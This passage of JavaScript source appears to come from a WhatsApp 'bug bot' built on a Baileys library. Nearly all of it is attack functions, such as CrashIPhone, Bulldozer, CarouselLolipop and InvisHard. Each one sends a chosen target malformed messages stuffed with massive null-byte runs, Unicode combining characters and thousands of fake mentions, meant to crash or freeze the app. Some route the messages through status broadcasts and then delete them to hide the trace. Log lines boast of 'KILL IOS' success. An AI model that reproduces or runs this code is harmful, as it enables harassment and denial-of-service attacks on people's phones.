      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await sock.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await sock.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: sock.generateMessageTag(),
        from: sock.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": sock.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await sock.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

async function AboutLove(sock, target) {

  const X = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "i love youu...",
      contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\u0000",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "call_permission_request",
                  paramsJson: "\n".repeat(1045000),
                },
              },
            },
          },
        },
      },
    },
  }, {});

  const ZN = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "lolipop loving with?...",
      contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          },
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "\u0000",
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "\n".repeat(1045000),
                },
              },
            },
          },
        },
      },
    },
  }, {});


  await sock.relayMessage("status@broadcast", X.message, {
    messageId: X.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  await sock.sendMessage("status@broadcast", { delete: X.key });


  await sock.relayMessage("status@broadcast", ZN.message, {
    messageId: ZN.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  await sock.sendMessage("status@broadcast", { delete: ZN.key });


  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "you so lovely my dear...", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        },
      },
    },
  },
  {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
  });

  await sock.relayMessage("status@broadcast", payload.message, {
    messageId: payload.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  await sock.sendMessage("status@broadcast", {
    delete: payload.key
  });

}

async function CarouselLolipop(sock, target) {
    console.log(chalk.red(`Lolipop Succes Sending Bug`));
    for (let i = 0; i < 75; i++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "LOLIPOP" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "LOLIPOP" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "LOLIPOP" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `§LolipopRelly§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
    }
}

async function TrashLocaIos2(sock, target, xrl = true) {
  const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿";
  
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: slash,
         name: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰρσρ.𝛆𝛘󠁀𞥆𝛆 ✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰρσρ.𝛆𝛘󠁀𞥆𝛆 ✩" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://Lolipop-Iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + TrashIosx, 
      }
      
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
    
  await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            xrl
                ? { messageId: msg.key.id, participant: { jid: target } }
                : { messageId: msg.key.id }
        );
      await sleep(5000)
  }
  
async function Bulldozer(sock, target) {
try {
const permen = "\u2063".repeat(4000);
const candy = "\u300B".repeat(3000);

const msg1 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "LOLIPOP - ANTI GEDOR",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(9000),  
          actions: [  
            { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + candy }  
          ],  
          version: 3  
        }  
      }  
    }  
  }  
};  

const msg2 = {  
  stickerMessage: {  
    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
    mimetype: "image/webp",  
    height: 9999,  
    width: 9999,  
    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileLength: 12260,  
    mediaKeyTimestamp: "1743832131",  
    isAnimated: false,  
    stickerSentTs: "X",  
    isAvatar: false,  
    isAiSticker: false,  
    isLottie: false,  
    contextInfo: {  
      mentionedJid: [  
        "0@s.whatsapp.net",  
        ...Array.from({ length: 1900 }, () =>  
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
        )  
      ],  
      stanzaId: "1234567890ABCDEF",  
      quotedMessage: {  
        paymentInviteMessage: {  
          serviceType: 3,  
          expiryTimestamp: Date.now() + 1814400000  
        }  
      }  
    }  
  }  
};  

const msg3 = {  
  viewOnceMessage: {  
    message: {  
      interactiveMessage: {  
        body: {  
          xternalAdReply: {  
            title: "Lolipop No Mercy",  
            text: permen  
          }  
        },  
        extendedTextMessage: {  
          text: "{".repeat(9000),  
          contextInfo: {  
            mentionedJid: Array.from(  
              { length: 2000 },  
              (_, i) => `1${i}@s.whatsapp.net`  
            )  
          }  
        },  
        businessMessageForwardInfo: {  
          businessOwnerJid: "13135550002@s.whatsapp.net"  
        },  
        nativeFlowMessage: {  
          buttons: [  
            { name: "cta_url", buttonParamsJson: "\u0005".repeat(1000) + candy },  
            { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(7000) + candy }  
          ],  
          nativeFlowResponseMessage: {  
            name: "galaxy_message",  
            paramsJson: "\u0000".repeat(7000),  
            version: 3  
          },  
          contextInfo: {  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
              )  
            ]  
          }  
        }  
      }  
    }  
  }  
};  

const msg4 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "Lolipop Mode Tawran",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(6000),  
          version: 3  
        },  
        contextInfo: {  
          participant: "0@s.whatsapp.net",  
          remoteJid: "status@broadcast",  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>  
              "1" + Math.floor(Math.random() * 500000).toString(16).padStart(6, "0")  
            )  
          ],  
          quotedMessage: {  
            paymentInviteMessage: {  
              serviceType: 3,  
              expiryTimeStamp: Date.now() + 1690500  
            }  
          }  
        }  
      }  
    }  
  }  
};  

const msg5 = {  
  requestPhoneNumberMessage: {  
    contextInfo: {  
      businessMessageForwardInfo: {  
        businessOwnerJid: "13135550002@s.whatsapp.net"  
      },  
      bimid: "apa an bego" + "p" + Math.floor(Math.random() * 99999),  
      forwardingScore: 100,  
      isForwarded: true,  
      forwardedNewsletterMessageInfo: {  
        newsletterJid: "120363321780349272@newsletter",  
        serverMessageId: 1,  
        newsletterName: "bim".repeat(1)  
      }  
    }  
  }  
};  

const msg6 = {  
  videoMessage: {  
    url: "https://example.com/video.mp4",  
    mimetype: "video/mp4",  
    fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",  
    fileLength: "1515940",  
    seconds: 14,  
    mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",  
    height: 1280,  
    width: 720,  
    fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",  
    directPath: "/example",  
    mediaKeyTimestamp: "1748276788",  
    contextInfo: {  
      isSampled: true,  
      mentionedJid: typeof mentionedList !== "undefined" ? mentionedList : []  
    }  
  }  
};  

const msg7 = [  
  {  
    ID: "68917910",  
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",  
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",  
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",  
  },  
  {  
    ID: "68884987",  
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",  
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",  
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",  
  }
]

for (const msg of [msg4, msg5, msg6]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of [msg1, msg2, msg3]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of msg7) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}

console.log(`FlowX Attacked Sending Bug To ${target} suksesfull`);

} catch (e) {
console.error(e);
}
}

async function CrashIPhone(sock, target) {
    let IosIp = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𑇂𑆵𑆴𑆿𑆿".repeat(60000),
                        locationMessage: {
                            degreesLatitude: 7778888888,
                            degreesLongitude: -7778888888,
                            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                            address: "\u0003".repeat(77777),
                        },
                        hasMediaAttachment: false,
                    },
                    extendedTextMessage: {
                        text: "IOSKILER" + "𑇂𑆵𑆴𑆿𑆿".repeat(9200),
                        contextInfo: {
                            stanzaId: "Lolipop-Id",
                            participant: target,
                            quotedMessage: {
                                conversation: "Turu...".repeat(88888),
                            },
                            disappearingMode: {
                                initiator: "CHANGED_IN_CHAT",
                                trigger: "CHAT_SETTING",  
                            },
                            inviteLinkGroupTypeV2: "DEFAULT",
                        },
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, IosIp.message, {
        messageId: null,
        participant: { jid: target },
    });
    console.log(chalk.red(`SUCCES SENDING BUG KILL IOS To => ${target}`));
}

async function blankSticker(sock, target) {
    await sock.relayMessage(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "X",
                name:
                    "𝚾 -Lolipop   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher:
                    "𝚾 - Lolipop  ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                stickers: [
                    {
                        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    }
                ],

                fileLength: "999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",

                directPath:
                    "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",

                contextInfo: {},

                packDescription:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞 ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                mediaKeyTimestamp: "1741150286",
                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

                thumbnailDirectPath:
                    "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",

                thumbnailSha256:
                    "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

                thumbnailEncSha256:
                    "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

                thumbnailHeight: 252,
                thumbnailWidth: 252,

                imageDataHash:
                    "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

                stickerPackSize: "999999999",
                stickerPackOrigin: "1"
            }
        }, { participant: { jid: target }});
    }
    
async function InvisHard(sock, target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "LOLIPOP",
                    footerText: "HALLO༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
async function FcLolipop(sock, target) {
  const {
    encodeSignedDeviceIdentity,
    jidEncode,
    jidDecode,
    encodeWAMessage,
    patchMessageBeforeSending,
    encodeNewsletterMessage
  } = require("@otaxayun/baileys");

  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices);

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let permen = xnxx();
  let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let XMods = sock.createParticipantNodes.bind(sock);
  let Cyber = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length)
      return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let memeg = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(
      memeg.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);

        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;

        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

